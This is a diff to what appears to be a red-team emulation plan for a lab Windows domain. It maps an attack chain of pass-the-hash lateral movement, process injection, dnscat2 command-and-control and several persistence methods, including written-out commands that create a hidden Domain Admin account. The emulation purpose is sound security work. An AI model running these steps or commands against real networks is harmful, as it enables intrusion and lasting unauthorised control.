@@ -69,14 +69,14 @@ flowchart TD
     E3 --> F0["Recover TESTLAB\\Administrator NT hash"]
 
     subgraph P31["Phase 3-1 — Lateral Movement & C2 (IIS01 → DC01)"]
-        F0 --> F1["Step 1: react2shell re-stage on IIS01\nCertCA.enc · CertEnrollAgent.exe · go-thehash.exe\nServiceInstaller.bin · NtServiceInstaller.bin\npolicyupdate.bin · policysync.bin"]
+        F0 --> F1["Step 1: react2shell re-stage on IIS01\nCertCA.enc · CertEnrollAgent.exe · go-thehash.exe\nServiceInstaller.bin · NtServiceInstaller.bin\npolicyupdate.bin · policysync.bin · policysync-host.bin"]
         F1 --> F2["Step 2: go-thehash.exe put → DC01 C$\nCertCA.enc + CertEnrollAgent.exe (NTLM PtH)\nEvent ID 4624 LogonProcessName: NtLmSsp on DC01"]
         F2 --> F3["go-thehash.exe exec-wmi → wmiprvse.exe\nspawns CertEnrollAgent.exe as TESTLAB\\Administrator\nHerpaderping → dnscat2 C2 on DC01"]
         F2 -.-> F3B["[ALT] Step 2B: go-thehash.exe exec → SCM transient service\nEvent ID 7045 → C2 as NT AUTHORITY\\SYSTEM"]
     end
 
     subgraph P32["Phase 3-2 — Persistence on DC01"]
-        F3 --> G0["Step 3: go-thehash.exe put → DC01 C$\npolicyupdate.exe · policysync.exe\nServiceInstaller.exe · NtServiceInstaller.exe"]
+        F3 --> G0["Step 3: go-thehash.exe put → DC01 C$\npolicyupdate.exe · policysync.exe · policysync-host.exe\nServiceInstaller.exe · NtServiceInstaller.exe"]
         G0 --> G1["Step 4: net user svcbackup /add /domain\nnet group 'Domain Admins' svcbackup /add\nSpecialAccounts\\UserList hide via reg add"]
         G0 --> G2["Step 5: WMI permanent event subscription\nCertPolicyTimer + CertPolicyFilter + CertPolicyConsumer\nwmiprvse.exe spawns policyupdate.exe every 60 s"]
         G0 --> G3["Step 6: SYSVOL logon script\nupdate.exe in SYSVOL scripts\nscripts.ini Default Domain Policy\nuserinit.exe executes on WS01 domain logon"]
@@ -147,7 +147,8 @@ flowchart TD
 | `CWLHerpaderping.exe` | `resources/payloads/process-injection/CWLHerpaderping/x64/Release/` | Phase 1 Step 1 — ghost process loader |
 | `WmiAvQuery.exe` | `resources/payloads/WmiAvQuery/` | Phase 2 Step 2 — staged as `diaghost.exe` |
 | `ReflectDump.exe` → `wdhelper.gz` | `resources/payloads/cred-access/LsassReflectDumping/` | Phase 2 Step 3 — staged as `wdhelper.exe` |
-| `dnscat2.exe` (persistence C2) | `resources/payloads/rce-and-c2/dnscat2/go-client/` | Phase 3-1 Step 1 — staged as `policyupdate.bin`, `policysync.bin`, `CertCA.enc` |
+| `dnscat2.exe` (`cmd/dnscat-dnsapi`) | `resources/payloads/rce-and-c2/dnscat2/go-client/` | Phase 3-1 Step 1 — staged as `policyupdate.bin`, `CertCA.enc` |
+| `policysync.exe` / `policysync-host.exe` (`cmd/dnsapi-service`) | `resources/payloads/rce-and-c2/dnscat2/go-client/` | Phase 3-1 Step 1 — staged as `policysync.bin`, `policysync-host.bin` |
 | `go-thehash.exe` | `resources/payloads/lateral-movement/go-thehash/` | Phase 3-1 Steps 1–2, Phase 3-2 Step 3 — PtH SMB/WMI/SCM |
 | `CertEnrollAgent.exe` (CWLHerpaderping, same build as Phase 1) | `resources/payloads/process-injection/CWLHerpaderping/x64/Release/` | Phase 3-1 Step 1 — re-staged for DC01 lateral movement |
 | `ServiceInstaller.exe` | `resources/payloads/persistence/windows-service/advapi32-cpp/` | Phase 3-2 Step 7B — SCM API service creation |
